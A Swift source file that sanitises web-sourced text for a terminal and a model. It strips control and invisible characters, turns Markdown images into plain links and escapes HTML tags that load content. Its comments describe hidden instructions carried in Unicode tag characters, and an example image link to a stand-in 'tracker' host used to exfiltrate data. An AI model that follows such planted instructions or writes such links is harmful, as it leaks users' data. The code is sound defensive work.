import Foundation

/// Cleans text that came from the web before it reaches a terminal or the
/// model.
public enum ResearchText {
    /// Removes C0 and C1 control characters other than tab and newline, the
    /// Unicode bidi overrides and invisible characters. Page titles, answers
    /// and URLs are printed to a terminal, where an ESC sequence could
    /// rewrite the screen, change the window title or hide part of the
    /// report; invisible characters, such as the Unicode tag block, can carry
    /// instructions a model reads but a person cannot see. Line and paragraph
    /// separators become newlines.
    public static func terminalSafe(_ text: String) -> String {
        var scalars = String.UnicodeScalarView()
        for scalar in text.unicodeScalars {
            if scalar.value == 0x2028 || scalar.value == 0x2029 {
                scalars.append("\n")
            } else if !isUnsafe(scalar) {
                scalars.append(scalar)
            }
        }
        return String(scalars)
    }

    /// Makes Markdown safe to open in a viewer: images become plain links and
    /// HTML tags that load something become text. A page could otherwise
    /// steer the model into writing `![x](https://tracker/?q=…)`, which a
    /// viewer would fetch as soon as the saved report is opened.
    public static func inertMarkdown(_ text: String) -> String {
        let withoutImages = text.replacingOccurrences(of: "![", with: "[")
        let range = NSRange(withoutImages.startIndex..., in: withoutImages)
        return loadingTag.stringByReplacingMatches(
            in: withoutImages, range: range, withTemplate: "&lt;$1")
    }

    /// A URL inside Markdown link parentheses: brackets and parentheses are
    /// percent-encoded so the URL cannot end the link early and start another.
    public static func markdownURL(_ text: String) -> String {
        var result = ""
        for character in url(text) {
            switch character {
            case "(": result += "%28"
            case ")": result += "%29"
            case "[": result += "%5B"
            case "]": result += "%5D"
            case "<": result += "%3C"
            case ">": result += "%3E"
            default: result.append(character)
            }
        }
        return result
    }

    private static let loadingTag = try! NSRegularExpression(
        pattern: #"<(\s*/?\s*(?:img|image|picture|source|video|audio|iframe|frame|object|embed|"#
            + #"link|svg|style|script|meta|base|input|form|track)\b)"#,
        options: [.caseInsensitive])

    /// A URL as one printable token: control characters and whitespace removed.
    public static func url(_ text: String) -> String {
        var scalars = String.UnicodeScalarView()
        for scalar in text.unicodeScalars
        where !isUnsafe(scalar) && !CharacterSet.whitespacesAndNewlines.contains(scalar) {
            scalars.append(scalar)
        }
        return String(scalars)
    }

    static func isUnsafe(_ scalar: Unicode.Scalar) -> Bool {
        switch scalar.value {
        case 0x09, 0x0A: return false
        case 0x00...0x1F, 0x7F...0x9F: return true
        case 0x202A...0x202E, 0x2060...0x2069: return true
        case 0xAD, 0x200B...0x200F, 0x2028, 0x2029, 0xFEFF, 0xE0000...0xE007F: return true
        default: return false
        }
    }
}
